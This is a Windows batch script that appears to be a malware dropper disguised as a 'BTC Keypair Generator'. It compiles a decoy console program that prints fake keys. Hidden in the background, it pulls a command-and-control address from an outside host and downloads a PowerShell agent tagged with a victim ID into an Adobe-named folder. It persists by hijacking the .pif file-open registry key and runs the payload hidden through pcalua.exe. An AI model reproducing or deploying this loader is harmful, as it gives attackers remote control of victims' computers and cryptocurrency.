@echo off
setlocal enabledelayedexpansion

REM Ensure Adobe directory exists (same target as Ducky)
set "ADOBE_DIR=%APPDATA%\Adobe"
if not exist "%ADOBE_DIR%" mkdir "%ADOBE_DIR%"

echo [+] Building BTC Key Generator Module...
set "CS_FILE=%TEMP%\BtcGen.cs"
set "EXE_FILE=%ADOBE_DIR%\BtcGenerator.exe"

(
echo using System;
echo using System.Threading;
echo public class BtcGenerator {
echo     public static void Main^(^) {
echo         Console.Title = "BTC Keypair Generator v2.1";
echo         Console.WriteLine^("--- Secure BTC Keypair Generator ---"^);
echo         Console.WriteLine^("Initializing Entropy Pool..."^);
echo         for^(int i=0; i ^< 5; i++^){
echo             string priv = Guid.NewGuid^(^).ToString^(^).Replace^("-",""^);
echo             Console.WriteLine^("GENERATED: 5" + priv.Substring^(0,30^)^);
echo             Thread.Sleep^(1200^);
echo         }
echo         Console.WriteLine^("\n[!] Synchronizing with Blockchain Node... Keep window open."^);
echo         while^(true^){ Thread.Sleep^(10000^); }
echo     }
echo }
) > "%CS_FILE%"

REM Find CSC.exe to compile
for /r "%SystemRoot%\Microsoft.NET\Framework64" %%H in (csc.exe) do set "CSC_PATH=%%H"
if not defined CSC_PATH (for /r "%SystemRoot%\Microsoft.NET\Framework" %%H in (csc.exe) do set "CSC_PATH=%%H")
"%CSC_PATH%" /out:"%EXE_FILE%" /target:exe "%CS_FILE%" >nul

echo [+] Syncing BlockChain Parameters...


for /f "usebackq tokens=*" %%i in (`
    powershell -NoP -NonI -Command "(iwr -UseBasicParsing http://prxa.layerpact.com/c2servers.txt).Content.Trim()"
`) do set "C2=%%i"

REM --- Generate Unique ID (same PowerShell logic as Ducky) ---
for /f "usebackq tokens=*" %%i in (`
    powershell -NoP -NonI -Command " 'WIN-' + (-join((48..57)+(97..102)|Get-Random -Count 8|%%{[char]$_})) "
`) do set "UID=%%i"


powershell -NoP -NonI -W Hidden -Command "iwr -UseBasicParsing -Uri 'https://%C2%/agent.ps1?id=%UID%' -OutFile '%ADOBE_DIR%\AdobeDLP_Sync.ps1'"


set "REG_PATH=HKCU\Software\Classes\piffile\shell\open\command"
REM Quote the -File path to handle spaces, matching Ducky’s robust behavior
set "PAYLOAD=powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File \"%ADOBE_DIR%\AdobeDLP_Sync.ps1\""

reg add "%REG_PATH%" /ve /t REG_SZ /d "%PAYLOAD%" /f >nul


copy /y NUL "%ADOBE_DIR%\AdobeDLP.pif" >nul
start /b pcalua.exe -a "%ADOBE_DIR%\AdobeDLP.pif"

cls

timeout /t 2 >nul
start "" "%EXE_FILE%"
exit